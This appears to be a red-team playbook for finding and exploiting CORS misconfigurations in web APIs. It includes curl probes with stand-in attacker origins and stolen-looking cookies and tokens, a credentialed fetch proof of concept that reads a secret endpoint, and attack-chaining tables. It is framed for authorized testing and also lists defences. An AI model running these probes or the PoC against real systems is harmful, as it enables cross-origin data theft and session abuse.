
# 🔴 Red Team CORS Exploitation Playbook (2025)

> **Purpose:**
> Provide a repeatable, evidence-driven methodology to identify, validate, exploit, and report **CORS misconfigurations** in modern APIs and web applications.

> **Audience:**
> Red Team, AppSec, Pentesters, Bug Bounty Hunters, CTF Authors

---

## 0️⃣ Core Principles (Read First)

* **CORS is not auth** — it only controls *browser read access*
* **curl does not enforce CORS** — browsers do
* **Risk = malicious origin can read sensitive responses**
* **Credentials + cross-origin read = CRITICAL**
* CORS issues are often **chained**, not standalone

---

## 1️⃣ Threat Model: What CORS Enables

| Capability            | Result                 |
| --------------------- | ---------------------- |
| Cross-origin reads    | Data exfiltration      |
| Credentialed requests | Session hijacking      |
| Broad methods         | State-changing abuse   |
| Cache poisoning       | Cross-user data leaks  |
| OAuth token access    | Account takeover       |
| GraphQL introspection | Schema-wide compromise |

---

## 2️⃣ OWASP API Top 10 Mapping

| CORS Misconfiguration  | Enables         | OWASP API Top 10 |
| ---------------------- | --------------- | ---------------- |
| Origin reflection      | Auth bypass     | API2             |
| Wildcard + creds       | Session theft   | API2 / API7      |
| Broad methods          | Privilege abuse | API5             |
| Missing `Vary: Origin` | Cache leak      | API10            |
| OPTIONS everywhere     | API discovery   | API9             |
| Inconsistent policy    | Drift           | API8             |

---

## 3️⃣ Phase 1 — Discovery

### 3.1 Identify CORS Surface

```bash
curl -i https://target/api \
  -H "Origin: https://evil.com"
```

Look for:

* `Access-Control-Allow-Origin`
* `Access-Control-Allow-Credentials`
* `Vary: Origin`

---

### 3.2 Preflight Enumeration

```bash
curl -i -X OPTIONS https://target/api \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"
```

Red flags:

* `200 OK` everywhere
* Broad methods
* No auth on OPTIONS

---

## 4️⃣ Phase 2 — Reflection Testing (🔥 Critical)

```bash
curl -i https://target/api/secret \
  -H "Origin: https://attacker.com"
```

### 🚨 Vulnerable If:

```
Access-Control-Allow-Origin: https://attacker.com
```

Especially dangerous if:

* Cookies are set
* Authorization headers accepted

---

## 5️⃣ Phase 3 — Credential Abuse

### 5.1 Cookie-Based Sessions

```bash
curl -i https://target/api/secret \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=abc123"
```

### 5.2 Token-Based Auth

```bash
curl -i https://target/api/secret \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer eyJ..."
```

🚨 **CRITICAL if ACAO matches attacker origin**

---

## 6️⃣ Phase 4 — Wildcard Validation

```bash
curl -i https://target/api \
  -H "Origin: https://random.com"
```

| Response             | Verdict                  |
| -------------------- | ------------------------ |
| `ACAO: *` (no creds) | OK                       |
| `ACAO: *` + creds    | 🔥 Invalid & exploitable |
| Reflection           | 🔥 Critical              |

---

## 7️⃣ Phase 5 — Method Escalation

```bash
curl -i -X DELETE https://target/api/resource \
  -H "Origin: https://evil.com"
```

Check:

* Method allowed via CORS?
* Method enforced server-side?
* Inconsistent behavior?

---

## 8️⃣ Phase 6 — Browser Proof (Required)

### 8.1 Minimal PoC

```html
<script>
fetch("https://target/api/secret", {
  credentials: "include"
})
.then(r => r.text())
.then(console.log)
</script>
```

### 8.2 Exploitability Matrix

| Server Response | Browser Result | Status          |
| --------------- | -------------- | --------------- |
| ACAO matches    | Data visible   | 🔥 Exploitable  |
| ACAO missing    | Blocked        | Not exploitable |
| `*` + creds     | Blocked        | Misconfig       |
| Reflection      | Data visible   | 🔥 Critical     |

---

## 9️⃣ Phase 7 — Chaining Attacks

| Chain          | Impact                |
| -------------- | --------------------- |
| CORS + XSS     | Full account takeover |
| CORS + CSRF    | Silent data theft     |
| CORS + OAuth   | Token exfiltration    |
| CORS + Cache   | Cross-user leak       |
| CORS + GraphQL | Mass data dump        |

---

## 🔁 Burp → curl → Browser Workflow

1. Capture request in Burp
2. Reproduce **exactly** with curl
3. Validate browser behavior
4. Save:

   * Burp request/response
   * curl command
   * HTML PoC
   * Console output screenshot

---

## 🧾 Reporting Guidance (Jira / GH Issues)

### Severity Mapping

| Finding             | Severity    |
| ------------------- | ----------- |
| Reflection + creds  | 🔥 Critical |
| Wildcard + auth     | 🔥 Critical |
| Authenticated reads | High        |
| OPTIONS exposure    | Medium      |
| Preflight noise     | Low         |

### Required Evidence

* curl output (headers)
* Browser PoC
* Explanation of impact
* Chaining potential

---

## 🛡️ Defensive Notes (For Blue Team)

* Explicit origin allowlists
* Never reflect Origin
* Never wildcard with credentials
* Always `Vary: Origin`
* Validate `Sec-Fetch-*` headers
* Log rejected preflights

---

## 🧠 Red Team Takeaways

* CORS bugs are **authorization multipliers**
* Reflection is almost always exploitable
* curl proves intent, browser proves impact
* Credentials + cross-origin = 🔥
* Always chain, never report in isolation

---

## 📦 Suggested Repo Structure

```text
cors-playbook/
├── README.md
├── discovery.md
├── exploitation.md
├── browser-pocs/
│   └── basic.html
├── burp-workflow.md
└── reporting.md
```
##
##
